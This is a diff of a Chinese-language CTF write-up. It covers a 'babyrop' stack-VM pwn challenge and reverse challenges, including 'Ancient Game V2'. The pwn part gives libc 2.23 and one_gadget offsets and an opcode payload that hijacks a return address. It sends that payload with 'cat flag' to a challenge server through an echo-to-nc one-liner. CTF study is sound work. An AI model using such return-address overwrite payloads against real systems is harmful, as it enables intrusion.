@@ -191,17 +191,17 @@ p.interactive()
 ```
 
 ### babyrop
-一个栈虚拟机，核心函数sub_1056
-stack_top初始在sub_1056的rbp-60h位置
+一个栈虚拟机，核心函数sub_1056  
+stack_top初始在sub_1056的rbp-60h位置  
 
-switch-case中几个有用的指令：
+switch-case中几个有用的指令：  
 * \x28：stack_top += 0x50，是唯一能够抬高栈的指令（ida逆向显示return，但是看汇编和调试，实际上是break。如果是return，这条指令就不能用了）
 * \x34：stack_top -= 8; \*(long \*)stack_top=\*(stack_top+8); \*(stack_top+8)=0，把栈顶的值向下移动
 * \x21：\*(long \*)stack_top += \*(long \*)(stack_top-8); \*(stack_top-8)=0，让栈顶的值加上栈顶下方的值
 * \x56+p32(const)：\*(long \*)stack_top = (int)const，把栈顶的值设为任意int范围的数
 * \x00：从sub_1056函数return
 
-第一次switch时栈的情况：
+第一次switch时栈的情况：  
 ```
 pwndbg> p /x $pc
 $1 = 0x555555555409
@@ -225,15 +225,15 @@ pwndbg> stack 0x20
 18:00c0│      0x7fffffffe1f0 ◂— 0x1f7ffcca0
 ... ↓
 ```
-此时
-stack_top = 0x7fffffffe150
-sub_1056的返回地址在0x7fffffffe1b8
-__libc_start_main_ret在0x7fffffffe1d8
+此时  
+stack_top = 0x7fffffffe150  
+sub_1056的返回地址在0x7fffffffe1b8  
+__libc_start_main_ret在0x7fffffffe1d8  
 
-libc 2.23 中的偏移量：
-__libc_start_main_ret	0x020830
-onegadget [rsp+0x30] == NULL 0x4526a
-相差0x24a3a
+libc 2.23 中的偏移量：  
+__libc_start_main_ret	0x020830  
+onegadget [rsp+0x30] == NULL 0x4526a  
+相差0x24a3a  
 
 利用：
 1. 0x28 两次，把stack_top抬升到0x7fffffffe1f0
@@ -246,10 +246,7 @@ onegadget [rsp+0x30] == NULL 0x4526a
 
 exp：
 ```
-from pwn import *
-s = remote("106.54.67.184", 16247)
-s.sendline("\x28\x28\x56\x00\x00\x00\x00\x34\x34\x56\x3a\x4a\x02\x00\x21\x34\x34\x34\x34\x34\x00")
-s.interactive()
+echo -e "\x28\x28\x56\x00\x00\x00\x00\x34\x34\x56\x3a\x4a\x02\x00\x21\x34\x34\x34\x34\x34\x00\ncat flag" | nc 106.54.67.184 16247
 ```
 
 ## REVERSE
@@ -267,28 +264,28 @@ patch CH1P_fs.ko，定位waifu.png的密文，提取出来，恢复出f_key，�
 用了MIRACL大数运算库，恢复函数名，发现DSA算法，pqgyrsk都有，推出私钥x，得`flag`的s，修改signed.out即可。
 
 ### Ancient Game V2
-用Python重新实现js里的m_vrun函数，在每轮while循环中打印一些信息帮助分析程序的逻辑
+用Python重新实现js里的m_vrun函数，在每轮while循环中打印一些信息帮助分析程序的逻辑  
 
-第一次调用m_vrun时ip=0，作用是打印banner，可以忽略
+第一次调用m_vrun时ip=0，作用是打印banner，可以忽略  
 
-第二次调用m_vrun时ip=19649，参数是输入的字符串
-while循环中a>0 and b<0条件时从input_buffer取输入，共50次，所以输入长度是50
-随便给一个输入，发现最终打印出"Sorry, please try again."。观察控制流中和output_buffer相关的ip(a<=0 and b<0)，发现只要ip跳到116723，就开始打印这句话。（将ip直接改为116723调用m_vrun，证实了这一点）
+第二次调用m_vrun时ip=19649，参数是输入的字符串  
+while循环中a>0 and b<0条件时从input_buffer取输入，共50次，所以输入长度是50  
+随便给一个输入，发现最终打印出"Sorry, please try again."。观察控制流中和output_buffer相关的ip(a<=0 and b<0)，发现只要ip跳到116723，就开始打印这句话。（将ip直接改为116723调用m_vrun，证实了这一点）  
 
-因此目标是不让程序的ip进入116723
+因此目标是不让程序的ip进入116723  
 
-分析程序
-第一阶段：从input_buffer取数字，然后用两次 与非 复制到另一个地方。
-第二阶段：逐一取第一阶段保存的输入值，与一些常量进行 与非 运算，然后进入分支选择。
-（产生分支的情况：b>=0而且是一个有效的ip，此时a<=0和a>0会走向不同的分支）
-这些地方的b都是116723，通过跟踪50个输入值在数据流中的传递发现a是从输入值经过运算得到的值。添加约束a>0，不让ip跳过去
-在m_vrun中把不满足条件的a强行修改，让程序可以继续执行下去
+分析程序  
+第一阶段：从input_buffer取数字，然后用两次 与非 复制到另一个地方。  
+第二阶段：逐一取第一阶段保存的输入值，与一些常量进行 与非 运算，然后进入分支选择。  
+（产生分支的情况：b>=0而且是一个有效的ip，此时a<=0和a>0会走向不同的分支）  
+这些地方的b都是116723，通过跟踪50个输入值在数据流中的传递发现a是从输入值经过运算得到的值。添加约束a>0，不让ip跳过去  
+在m_vrun中把不满足条件的a强行修改，让程序可以继续执行下去  
 
-第三阶段：
-强行修改上面的a之后程序还是会进入116723，而且这些分支的a不受输入值的影响。从第一个进入116723的分支向上追溯控制流，找到最近的一个a受到输入值影响的分支，发现这个分支的a<=0，没有跳到b的位置。
-提取这个b的值，尝试直接将ip直接改为该值调用m_vrun，发现程序打印出了"Correct."
-发现第三阶段控制流有多次跳转到这个b值的机会，但是如果添加约束a<=0让它第一次遇到就跳转，最后会unsat。所以添加约束：在这些遇到b值的地方，至少要有一次a<=0（不一定是第一次）
-对于50个输入值，每个输入值都有一个这样的b值，手动提取出来
+第三阶段：  
+强行修改上面的a之后程序还是会进入116723，而且这些分支的a不受输入值的影响。从第一个进入116723的分支向上追溯控制流，找到最近的一个a受到输入值影响的分支，发现这个分支的a>0，没有跳到b的位置。  
+提取这个b的值，尝试直接将ip直接改为该值调用m_vrun，发现程序打印出了"Correct."  
+发现第三阶段控制流有多次跳转到这个b值的机会，但是如果添加约束a<=0让它第一次遇到就跳转，最后会unsat。所以添加约束：在这些遇到b值的地方，至少要有一次a<=0（不一定是第一次）  
+对于50个输入值，每个输入值都有一个这样的b值，手动提取出来  
 
 最终exp：
 ```
